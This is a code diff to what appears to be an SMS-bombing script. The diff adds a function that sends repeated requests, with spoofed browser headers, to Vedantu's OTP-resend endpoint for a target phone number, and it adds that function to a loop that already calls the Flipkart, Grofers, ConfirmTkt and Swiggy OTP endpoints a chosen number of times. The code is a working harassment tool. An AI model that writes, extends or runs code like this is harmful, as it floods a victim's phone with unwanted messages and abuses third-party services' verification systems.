@@ -158,6 +158,30 @@ def swiggy_api():
 	else:
 		print('Failed - Swiggy')
 
+def vedantu_api():
+	url = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'
+
+	_headers = {
+		'Host': 'user.vedantu.com',
+		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
+		'Accept': '*/*',
+		'Accept-Language': 'en-US,en;q=0.5',
+		'Accept-Encoding': 'gzip, deflate, br',
+		'Content-Type': 'application/json',
+		'Content-Length': '84',
+		'Origin': 'https://www.vedantu.com',
+		'Connection': 'keep-alive',
+		'Referer': 'https://www.vedantu.com/',
+	}
+
+	data = {"email":'null',"phoneCode":"+91","phoneNumber":""+mobno,"ver":"12.104"}
+
+	requests = rq.post(url,headers=_headers,json=data)
+
+	if requests.json()['success'] == True:
+		print('Success - Vedantu')
+	else:
+		print('Failed - Vedantu')
 
 for x in range(0,quantity):
 	flipkart_api()
@@ -165,3 +189,4 @@ for x in range(0,quantity):
 	grofers_api()
 	confirmtkt_api()
 	swiggy_api()
+	vedantu_api()
